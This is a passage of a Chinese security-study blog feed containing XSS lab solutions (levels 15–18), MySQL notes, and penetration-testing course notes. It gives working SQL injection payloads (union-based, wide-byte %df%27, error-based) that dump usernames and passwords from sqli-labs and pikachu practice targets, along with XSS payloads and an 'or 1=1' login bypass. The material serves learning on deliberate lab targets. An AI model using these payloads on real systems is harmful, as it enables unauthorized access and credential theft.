src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8801%E6%97%A51418_1.png" alt></p><h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><p>题目地址失效</p><h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><p><code>ng-include</code>指令：</p><pre><code>1、ng-include 指令用于包含外部的 HTML文件。2、包含的内容将作为指定元素的子节点。3、ng-include 属性的值可以是一个表达式，返回一个文件名。4、默认情况下，包含的文件需要包含在同一个域名下。特别值得注意的几点如下：1.ng-include,如果单纯指定地址，必须要加引号2.ng-include,加载外部html，script标签中的内容不执行3.ng-include,加载外部html中含有style标签样式可以识别</code></pre><p>既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件，构造payload：</p><pre><code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><p>name为level1中传入的参数值</p><h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;</code></pre><p>特殊点：插入了center标签</p><p>但是过滤了多次空格像是在给我们提示：%0a,构造payload：</p><pre><code>&lt;img%0asrc=666%0aonerror=alert(666);&gt;</code></pre><p>经过测试%09失败</p><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p><a href="https://www.runoob.com/tags/att-embed-src.html" target="_blank" rel="noopener">HTML <embed> src 属性</a></p><p> 构造payload：</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p>构造payload：</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><p>涉及反编译，待解</p><h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><p>涉及反编译，待解</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL的学习</title>
      <link href="/2021/03/22/mysql-de-xue-xi/"/>
      <url>/2021/03/22/mysql-de-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1415663223&auto=1&height=66"></iframe><h1 id="MySQL学习笔记"><a href="#MySQL学习笔记" class="headerlink" title="MySQL学习笔记"></a>MySQL学习笔记</h1><h2 id="创建goods（货物）表结构"><a href="#创建goods（货物）表结构" class="headerlink" title="创建goods（货物）表结构"></a>创建goods（货物）表结构</h2><h3 id="1-创建数据库db-shop"><a href="#1-创建数据库db-shop" class="headerlink" title="1.创建数据库db_shop"></a>1.创建数据库db_shop</h3><pre><code>create database db_shop;</code></pre><h3 id="2-选择数据库"><a href="#2-选择数据库" class="headerlink" title="2.选择数据库"></a>2.选择数据库</h3><pre><code>use db_shop;</code></pre><h3 id="3-创建数据表"><a href="#3-创建数据表" class="headerlink" title="3.创建数据表"></a>3.创建数据表</h3><pre><code>create table goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h3 id="4-添加表单数据"><a href="#4-添加表单数据" class="headerlink" title="4.添加表单数据"></a>4.添加表单数据</h3><pre><code>show tables;select * from goods;insert into goods(id,type,name) values(1,&#39;书籍&#39;,&#39;杨云凯的成功学&#39;);</code></pre><h3 id="5-向表中的所有列插入数据："><a href="#5-向表中的所有列插入数据：" class="headerlink" title="5.向表中的所有列插入数据："></a>5.向表中的所有列插入数据：</h3><pre><code>insert into goods values(3,&#39;slave&#39;,&#39;王国强的脑袋&#39;,1,1,&#39;2021-3-29&#39;),(4,&#39;slave&#39;,&#39;王国强的手&#39;,1,1,&#39;2021-3-29&#39;),(5,&#39;slave&#39;,&#39;王国强的脚&#39;,1,1,&#39;2021-3-29&#39;),(6,&#39;slave&#39;,&#39;王国强的眼珠子&#39;,1,1,&#39;2021-3-29&#39;);</code></pre><h3 id="6-创建新表："><a href="#6-创建新表：" class="headerlink" title="6.创建新表："></a>6.创建新表：</h3><pre><code>create table new_goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h3 id="7-将goods的内容插入到new-goods中："><a href="#7-将goods的内容插入到new-goods中：" class="headerlink" title="7.将goods的内容插入到new_goods中："></a>7.将goods的内容插入到new_goods中：</h3><pre><code>insert into new_goods() select *from goods;</code></pre><h2 id="实操1-school-："><a href="#实操1-school-：" class="headerlink" title="实操1(school)："></a>实操1(school)：</h2><h3 id="1-创建数据库school并使用"><a href="#1-创建数据库school并使用" class="headerlink" title="1.创建数据库school并使用:"></a>1.创建数据库school并使用:</h3><pre><code>creat database school;use school;</code></pre><h3 id="2-创建表music："><a href="#2-创建表music：" class="headerlink" title="2.创建表music："></a>2.创建表music：</h3><p>unsigned(不能为负数)</p><pre><code>creat table music(id int(11) unsigned not null auto_increment,name varchar(20) not null,primary key(id));</code></pre><h2 id="sql注入实操语句："><a href="#sql注入实操语句：" class="headerlink" title="sql注入实操语句："></a>sql注入实操语句：</h2><pre><code>create table user(id int(11) primary key auto_increment,uname varchar(30) not null,passwd varchar(30) unique,add_time datetime);</code></pre><pre><code>insert into user(id,uname,passwd) values(1,&#39;admin&#39;,&#39;123&#39;);</code></pre><pre><code>select * from user where uname = &#39;admin&#39; or 1=1#&#39; and passwd = &#39;123&#39;;</code></pre><h2 id="MySQL-ALTER命令："><a href="#MySQL-ALTER命令：" class="headerlink" title="MySQL ALTER命令："></a>MySQL ALTER命令：</h2><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令。</p><p>创建菜鸟数据库并使用：</p><pre><code>creat database runoob;use runoob;</code></pre><p>创建表：</p><pre><code>create table alter_tbl(i INT,c CHAR(1));</code></pre><h3 id="删除，添加或修改表字段："><a href="#删除，添加或修改表字段：" class="headerlink" title="删除，添加或修改表字段："></a>删除，添加或修改表字段：</h3><p>如下命令使用了 ALTER 命令及 DROP 子句来删除以上创建表的 i 字段：</p><pre><code>ALTER TABLE alter_tb  DROP i;</code></pre><p>如果数据表中只剩余一个字段则无法使用DROP来删除字段。</p><p>MySQL 中使用 ADD 子句来向数据表中添加列，如下实例在表 alter_tb 中添加 i 字段，并定义数据类型:</p><pre><code>ALTER TABLE alter_tb ADD i INT;</code></pre><p>执行以上命令后，i 字段会自动添加到数据表字段的末尾。</p><p>如果你需要指定新增字段的位置，可以使用MySQL提供的关键字 FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）。</p><p>尝试以下 ALTER TABLE 语句, 在执行成功后，使用 SHOW COLUMNS 查看表结构的变化：</p><pre><code>ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT FIRST;ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT AFTER c;</code></pre><p>FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句，所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。</p><h3 id="修改字段类型及名称"><a href="#修改字段类型及名称" class="headerlink" title="修改字段类型及名称"></a>修改字段类型及名称</h3><p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。</p><p>例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令:</p><pre><code>ALTER TABLE alter_tb MODIFY c CHAR(10);</code></pre><p>使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。尝试如下实例：</p><pre><code>ALTER TABLE alter_tb CHANGE i j BIGINT;ALTER TABLE alter_tb CHANGE j j INT;</code></pre><h3 id="修改字段默认值："><a href="#修改字段默认值：" class="headerlink" title="修改字段默认值："></a>修改字段默认值：</h3><pre><code>ALTER TABLE alter_tb ALTER i SET DEFAULT 1000;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | 1000    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><p>你也可以使用 ALTER 命令及 DROP子句来删除字段的默认值，如下实例：</p><pre><code>ALTER TABLE alter_tb ALTER i DROP DEFAULT;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | NULL    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)Changing a Table Type:</code></pre><h3 id="修改表名："><a href="#修改表名：" class="headerlink" title="修改表名："></a><strong>修改表名：</strong></h3><p>如果需要修改数据表的名称，可以在 ALTER TABLE 语句中使用 RENAME 子句来实现。</p><p>尝试以下实例将数据表 alter_tb 重命名为 alter_tbl：</p><pre><code>ALTER TABLE alter_tb RENAME TO alter_tbl;</code></pre><h2 id="MySQL预编译："><a href="#MySQL预编译：" class="headerlink" title="MySQL预编译："></a>MySQL预编译：</h2><h3 id="1-预编译相关语法如下："><a href="#1-预编译相关语法如下：" class="headerlink" title="1.预编译相关语法如下："></a>1.预编译相关语法如下：</h3><pre><code>set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句</code></pre><h3 id="2-常用操作"><a href="#2-常用操作" class="headerlink" title="2:常用操作"></a>2:常用操作</h3><p> 1:创建预处理语句</p><p>  prepare stmt_name from ‘select * from t_copy where id&gt;?’;</p><h3 id="2-设置一个全局的变量"><a href="#2-设置一个全局的变量" class="headerlink" title="2:设置一个全局的变量"></a>2:设置一个全局的变量</h3><p>  set @ i=5;</p><h3 id="3-执行stmt-name预处理语句"><a href="#3-执行stmt-name预处理语句" class="headerlink" title="3:执行stmt_name预处理语句"></a>3:执行stmt_name预处理语句</h3><p>  execute stmt_name using @i;</p><h3 id="4-删除预处理"><a href="#4-删除预处理" class="headerlink" title="4:删除预处理"></a>4:删除预处理</h3><p>  drop prepare stmt_name </p><p>同时也可以先现设置预编译的语句：</p><pre><code>@p = &#39;user&#39;;@sql = concat(&#39;select * from&#39;,@p);prepare stmt_name from @sql;execute stmt_name;drop prepare stmt_name;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于HW前的学习</title>
      <link href="/2021/03/19/hua-meng-xue-yuan/"/>
      <url>/2021/03/19/hua-meng-xue-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1297742167&auto=1&height=66"></iframe><h1 id="1-前端基础"><a href="#1-前端基础" class="headerlink" title="1.前端基础"></a>1.前端基础</h1><h2 id="1-HTML静态页面基础课"><a href="#1-HTML静态页面基础课" class="headerlink" title="1.HTML静态页面基础课"></a>1.HTML静态页面基础课</h2><pre><code>&lt;strong&gt;&lt;/strong&gt;加粗</code></pre><p>表格标签：</p><pre><code>&lt;tr&gt;&lt;/tr&gt;表示一行&lt;td&gt;&lt;/td&gt;表示一行中的内容</code></pre><p>td中含有属性：居中对齐等</p><p>table中含有单元格间距和填充，合并单元格等。。</p><p>列表标签：</p><p><a href="http://t.mb5u.com/html/detail/detail_input.html" target="_blank" rel="noopener">表单标签：</a></p><p>作业：99乘法表</p><h2 id="2-HTML静态开发"><a href="#2-HTML静态开发" class="headerlink" title="2.HTML静态开发"></a>2.HTML静态开发</h2><pre><code>&lt;p&gt;&lt;/p&gt;段落标签其可以与加粗，倾斜，删除线，下划线结合使用&lt;div&gt;&lt;/div&gt;一般用于存放图片，文字，视频等网页内容，可以以理解为一个盒子，可以存放一切东西&lt;span&gt;&lt;/span&gt;与上面不同的是它只可以存放文字&lt;img /&gt;指定图像文件</code></pre><p><a href="https://www.webhek.com/post/html-enerty-code.html" target="_blank" rel="noopener">特殊字符 </a></p><h2 id="3-CSS层叠样式开发"><a href="#3-CSS层叠样式开发" class="headerlink" title="3.CSS层叠样式开发"></a>3.CSS层叠样式开发</h2><h2 id="5-Javascript基础"><a href="#5-Javascript基础" class="headerlink" title="5.Javascript基础"></a>5.Javascript基础</h2><p>windows.alert()弹出警告框</p><p>document.write()将方法写入到HTML文档中</p><p>innerHTML写入到HTML元素</p><p>使用console.log()写入到浏览器的控制台(console.log可以使想要的内容在控制台输出)</p><p>在使用时需要将其到加入</p><pre><code>&lt;script&gt;&lt;/script&gt;</code></pre><p>标签</p><h2 id="6-Javascript对象与事件"><a href="#6-Javascript对象与事件" class="headerlink" title="6.Javascript对象与事件"></a>6.Javascript对象与事件</h2><p><a href="http://c.biancheng.net/view/5944.html" target="_blank" rel="noopener">js鼠标事件</a></p><p><a href="https://www.jianshu.com/p/dbbd31eb5b26" target="_blank" rel="noopener">表单相关事件</a></p><p><a href="https://blog.csdn.net/smartsmile2012/article/details/53940331" target="_blank" rel="noopener">JS鼠标事件、HTML页面事件大全</a></p><p>关于onfocus获取焦点事件可以用来防御对输入框进行攻击的时候的使用，保证出现无限弹窗</p><h1 id="2-PHP课程"><a href="#2-PHP课程" class="headerlink" title="2.PHP课程"></a>2.PHP课程</h1><h2 id="1-php运算"><a href="#1-php运算" class="headerlink" title="1.php运算"></a>1.php运算</h2><p>1.十进制dec二进制bin八进制oct十六进制hex</p><pre><code>echo decbin(123);//十进制转二进制依次类推即可</code></pre><p>2.’ ‘与” “的区别：前者内容包裹的是纯纯的字符串，而后者中可以包裹的有变量</p><p>3.错误抑制符@：在已知一些错误会报错，但是不想让他报错，就用到了错误抑制符（@）</p><h2 id="2-PHP循环"><a href="#2-PHP循环" class="headerlink" title="2.PHP循环"></a>2.PHP循环</h2><ul><li>for循环：通过天剑、起始和终止判断执行</li><li>while循环：通过判断条件终止</li><li>do-while：跟while差不多</li><li>foreach循环：专门针对数组</li></ul><p>for循环之死循环：</p><pre><code>无增量，条件永远为真：&lt;?phpfor($i=1;$i&lt;10;){}只要没有条件都是死循环：&lt;?phpfor($i=1;;$i++){}无条件无增量&lt;?phpfor(;;){}</code></pre><h2 id="3-PHP函数文件上传"><a href="#3-PHP函数文件上传" class="headerlink" title="3.PHP函数文件上传"></a>3.PHP函数文件上传</h2><p>被传入的参数称为实参</p><p>$_FILES在PHP中，是一个预定义变量，专门用来储存上传的文件</p><h2 id="4-PHP面向对象命名空间"><a href="#4-PHP面向对象命名空间" class="headerlink" title="4.PHP面向对象命名空间"></a>4.PHP面向对象命名空间</h2><p>类常量（在类中定义常量）的定义只能使用一种方式：const 常量名= 值；</p><p>命名空间：</p><p>避免出现相同结构而造成的冲突，比如一个文件夹下面不能有两个1.php，所以需要建两个空间，这样重名的话就不会报错，定义命名空间的时候其前面是不能有代码的</p><h2 id="5-PHP数据库"><a href="#5-PHP数据库" class="headerlink" title="5.PHP数据库"></a>5.PHP数据库</h2><p>MySQL连接只限于php7版本以下</p><h2 id="6-php开发小实例"><a href="#6-php开发小实例" class="headerlink" title="6.php开发小实例"></a>6.php开发小实例</h2><h1 id="3-WEB渗透精英班课程"><a href="#3-WEB渗透精英班课程" class="headerlink" title="3.WEB渗透精英班课程"></a>3.WEB渗透精英班课程</h1><h2 id="1-基础篇课程-扫盲课"><a href="#1-基础篇课程-扫盲课" class="headerlink" title="1.基础篇课程(扫盲课)"></a>1.基础篇课程(扫盲课)</h2><ul><li><h3 id="计算机组成与DOS命令"><a href="#计算机组成与DOS命令" class="headerlink" title="计算机组成与DOS命令"></a>计算机组成与DOS命令</h3></li></ul><h4 id="常见的协议与端口："><a href="#常见的协议与端口：" class="headerlink" title="常见的协议与端口："></a>常见的协议与端口：</h4><p>21/tcp FTP 文件传输协议；25 SMTP；69/udp 简单文件传输协议；110/tcp pop3邮件接收；443 HTTPS 安全的HTTP（加密传输）；3389/rdp 远程连接 远程桌面；445/smb 文件共享；3306 MySQL数据库；1521 Oracle数据库；</p><h4 id="常见的dos命令"><a href="#常见的dos命令" class="headerlink" title="常见的dos命令"></a><a href="https://wenku.baidu.com/view/8ffad7a9dd3383c4bb4cd29a.html" target="_blank" rel="noopener">常见的dos命令</a></h4><ul><li><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3></li></ul><p><a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869" target="_blank" rel="noopener">osi七层模型：</a></p><p><a href="https://blog.csdn.net/ffsiwei/article/details/82121010" target="_blank" rel="noopener">tcp/ip五层模型：</a></p><p><a href="https://blog.csdn.net/qq_30553235/article/details/79282113" target="_blank" rel="noopener">常用的HTTP请求头与响应头</a></p><ul><li><h3 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h3></li></ul><p><a href="https://blog.csdn.net/m0_46575550/article/details/106576158" target="_blank" rel="noopener">要求给你一个网站，需要了解到这个网站的一些配置</a></p><ul><li><h3 id="Linux使用（review）"><a href="#Linux使用（review）" class="headerlink" title="Linux使用（review）"></a>Linux使用（review）</h3></li></ul><p><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Linux命令大全</a></p><p><a href="https://blog.csdn.net/qq_36802111/article/details/82177844" target="_blank" rel="noopener">Linux常用命令大全+详解</a></p><p>find grep</p><p>uptime</p><p><strong>进程信息查看：</strong></p><pre><code>ps aux暂时的查看当前cpu的使用率ps top动态的查看kill [-9] [进程代号]：-9表示强行删除</code></pre><p>mkdir (file)：创建一个文本夹</p><p>touch 创建txt文件</p><p>dir：查看当前的目录</p><p>ls -la：查看当前文件并更多信息（如：文件所被给予的权限）</p><p>rm <file>：-rf强行删除文件</file></p><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p><p>tar -cvf 1.tar 1.txt ：打包1.txt文件</p><p>tar -xvf 1.tar 1.txt ：解包</p><p>gzip表示压缩，与tar命令结合使用：例如-zxvf，同时打包文件.tar.gz</p><ul><li><h3 id="kali的安装与配置"><a href="#kali的安装与配置" class="headerlink" title="kali的安装与配置"></a>kali的安装与配置</h3></li></ul><h2 id="2-WEB渗透篇"><a href="#2-WEB渗透篇" class="headerlink" title="2.WEB渗透篇"></a>2.WEB渗透篇</h2><ul><li><h3 id="网络安全与渗透测试流程"><a href="#网络安全与渗透测试流程" class="headerlink" title="网络安全与渗透测试流程"></a>网络安全与渗透测试流程</h3></li></ul><p>威胁建模阶段→漏洞分析阶段→渗透攻击阶段→后渗透攻击阶段→撰写报告阶段</p><p>实际渗透测试中的流程：</p><p>明确目标→信息收集→漏洞发现→漏洞利用→后渗透→报告文档阶段</p><ul><li><h3 id="资产与信息收集"><a href="#资产与信息收集" class="headerlink" title="资产与信息收集"></a>资产与信息收集</h3></li></ul><p>1.从主域名出发，向其旁站扩散</p><p>2.子域名收集（layer子域名挖掘机（枚举性质），<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>（根据接口，需要配置api：在\OneForAll-master\config\api.py ）），相关域名收集</p><p>3.通过搜索引擎（第三方）：常用第三方子域名爆破接口</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/（旁站查询）" target="_blank" rel="noopener">https://chapangzhan.com/（旁站查询）</a></p><p>4.app，小程序，公众号</p><p>5.备案信息查询（基本无效信息）：</p><p>爱站网，<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></p><p>6.ip信息收集：有的企业做了cdn加速，例如使用七牛云针对图床进行加速，所以就需要进行cdn的绕过，来找到被加速的服务器（ip地址）</p><p>绕过方法：</p><ul><li><p><strong>多地ping</strong>（国外）</p></li><li><p><strong>对分站进行ping</strong></p></li></ul><p>7.在线cms指纹识别</p><p>云悉指纹：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>潮汐指纹：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.服务器/中间器/站点架构信息</p><p>9.利用nmap：</p><p>-vv：对结果的详细输出</p><p>-sP：ping扫描</p><p>-sT：tcp连接扫描：完整三次握手，最基础稳定的扫描方式</p><p>-sS：tcp syn扫描</p><p>-sU：udp扫描，扫描速度非常慢</p><p>-P0：无ping扫描，用于进制ping的扫描</p><p>10.waf信息识别：</p><pre><code>wafw00f -a [域名]</code></pre><ul><li><h3 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h3></li></ul><p><strong>MySQL基础语法：</strong></p><p>select version()；</p><p>select user();</p><p>select @@basedir;查询当前路径。</p><p>show databases；</p><p>use + 数据库名；选择一个数据库。</p><p>select database();查询当前数据库。</p><p>show tables;查询所有表名。</p><p>create database + 数据库名;创建一个数据库。</p><p>drop database + 数据库名;删除一个数据库。</p><p>desc + 表名;查询一个表的结构。</p><p><strong>当创建一个表的时候它有六个属性：field(文件名)、type(类型)、null、key、default、extra</strong></p><p>想要使用中文，就要设置起编码：set names gbk；</p><p><strong>更新数据：</strong></p><p>1.更新指定数据，使用where子句来指定</p><p>update 表名 set 字段名1=值1，[字段名2=值2] [where条件表达式]</p><p>例如：向数据库class下student表中id为1的数据中字段age改为16，字段birthday改为2004。</p><p>update student set age =16，birthday=2004 where id=1;</p><p>2.如果没有where语句，则表中所有的记录都更新</p><p><strong>distinct关键字查询：</strong></p><p>例如：</p><p>查询数据库class下查student表中birthday字段的值，结果中不允许出现重复的值。</p><p>select distinct birthday from student;</p><p><strong>带like关键字的查询：</strong></p><p>%通配符</p><p>例如：</p><p>查询数据库class下student表中呢么字段以字符“s”开头的的人的id，name。</p><p>select id,name from student where name like “s%”；</p><p><strong>count函数</strong>：统计记录的条数</p><p>例如：</p><p>select count(*) from student;</p><p><strong>group by</strong>：</p><p>将列中的字段（相同）按组排列</p><p><strong>order by</strong>：</p><p>按照列中的内容进行排列</p><p><a href="https://blog.csdn.net/qq_22642239/article/details/52127016" target="_blank" rel="noopener">MySQL函数大全</a></p><p><strong>source +.sql文件</strong>：将.sql文件载入到数据库中</p><p><strong>内联注释</strong>:(查版本号)</p><pre><code>/*![版本号]*/</code></pre><p>若大于则执行失败</p><ul><li><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2></li></ul><h4 id="判断注入："><a href="#判断注入：" class="headerlink" title="判断注入："></a>判断注入：</h4><p> 1.利用and 和or来判断，xor异或：只有当一真一假的时候才会为正确，其余的都是假的</p><h4 id="sqli-labs搭建完成："><a href="#sqli-labs搭建完成：" class="headerlink" title="sqli-labs搭建完成："></a><strong>sqli-labs搭建完成：</strong></h4><h5 id="less-2："><a href="#less-2：" class="headerlink" title="less-2："></a>less-2：</h5><pre><code>-1 union select 1,database(),3</code></pre><p>库名：security</p><pre><code>-1 union select 1,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),3</code></pre><p>由于显示表只能显示一行，所以需要limit来逐个回显，这里我们就可以结合burp来实现高效率的爆破表明，也就是将0换为123456789………,但是可以使用group_concat函数</p><p>表名：emails、referers、uagents、users</p><pre><code>-1 union select 1,(select group_concat(0x7e,column_name) from information_schema.columns where table_name=&#39;users&#39;),3</code></pre><p>列名(字段)：<del>id,</del>username,~password</p><p>老师的构造：</p><pre><code>-1 union select 1,group_concat(0x7e,username),group_concat(0x7e,password) from users</code></pre><p>我的构造：</p><pre><code>-1 union select 1,2,group_concat(username,0x7e,password) from users</code></pre><p>得到所有用户的隐私了</p><h5 id="less-1："><a href="#less-1：" class="headerlink" title="less-1："></a>less-1：</h5><p>字符型：1’ and 1=2#会报错，根据less-2直接构造</p><pre><code>-1&#39; union select 1,2,group_concat(username,0x7e,password) from users%23</code></pre><p>直接一把梭，不过要注意#需要进行URL转化→%23</p><h4 id="sql注入-搜索型（pikachu靶场搭建完成）："><a href="#sql注入-搜索型（pikachu靶场搭建完成）：" class="headerlink" title="sql注入-搜索型（pikachu靶场搭建完成）："></a>sql注入-搜索型（pikachu靶场搭建完成）：</h4><p>sql语句原型：select * from news where content like ‘%d%’</p><p>想办法闭合掉单引号和百分比号</p><pre><code>1%&#39; and 1=2 --1%&#39; order by 4 --+1%&#39; order by 3 --+</code></pre><p>有三个字段</p><pre><code>1%&#39; union select 1,database(),3 --+</code></pre><p>库名：pikachu </p><pre><code>1%&#39; union select 1,(select group_concat(table_name)+from+information_schema.tables+where+table_schema=&#39;pikachu&#39;),3 --+</code></pre><p>表名：httpinfo,member,message,users,xssblind </p><pre><code>1%&#39; union select 1,(select group_concat(column_name)+from+information_schema.columns+where+table_name=&#39;users&#39;),3 --+</code></pre><p>列明：id,username,password,level,id,username,password </p><p>爆破字段值</p><pre><code>1%&#39; union select 1,2,group_concat(username,0x7e,password)+from+users --+</code></pre><p>密码是经过hash的</p><h4 id="宽字节注入原理-less-32-："><a href="#宽字节注入原理-less-32-：" class="headerlink" title="宽字节注入原理(less-32)："></a>宽字节注入原理(less-32)：</h4><p>1.对用户输出的单引号进行处理，在单引号前加上斜杠进行转义，这样单引号就失去了作用</p><p>2.注入思路：</p><p>a.让斜杠失去作用</p><p>b.让斜杠消失</p><p>3.MySQL在使用gbk编码的时候，会认为两个字符为一个汉字</p><p><strong>开始打关：</strong></p><p>技巧：通过gbk编码的特性利用%df的特性来使后面的%5c→/的两个字符组合，认为是一个汉字，这时候单引号就被闭合了</p><pre><code>%df%27+order by 4+--+%df%27+order by 3+--+%df%27+union select 1,database(),3+--+</code></pre><p>库名：security</p><p>跟less-2一样，可以直接一把梭：</p><pre><code>%df%27+union select 1,group_concat(username,0x7e,password),3+from users+--+</code></pre><p>得到用户隐私信息</p><h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>有10种之多的报错注入除了e和u还有floor()三种为主要</p><p>相关函数：</p><p>count()显示有几条（行）数据</p><p>rand()随机产生一个0-1的浮点数，其中可以指定一个种子，用来产生重复序列</p><p>floor()取整数</p><p>group by：根据by后面的进行分类分组，顺序为数字。字母</p><p>extractvalue()：其能查询的字符串我的最大长度为32，如果超过32的话，就需要使用substring()函数截取，依次查看32位</p><h5 id="第一种报错方式—利用主键冲突的原理来报错注入："><a href="#第一种报错方式—利用主键冲突的原理来报错注入：" class="headerlink" title="第一种报错方式—利用主键冲突的原理来报错注入："></a>第一种报错方式—利用主键冲突的原理来报错注入：</h5><p>count+group by+floor(rand(0)*2)</p><p>因为rand出来的数是小于1的，所以*2后经过floor取整要么是0要么是1，当这三个函数相遇的时候就会出现主键冲突</p><pre><code>select count(*) from users group by concat(version(),floor(rand(0)*2));</code></pre><h5 id="less-5："><a href="#less-5：" class="headerlink" title="less-5："></a>less-5：</h5><p>依然是三列：<strong>order by 4报错</strong></p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,database())+--+</code></pre><p>库名：security</p><pre><code>-1&#39; 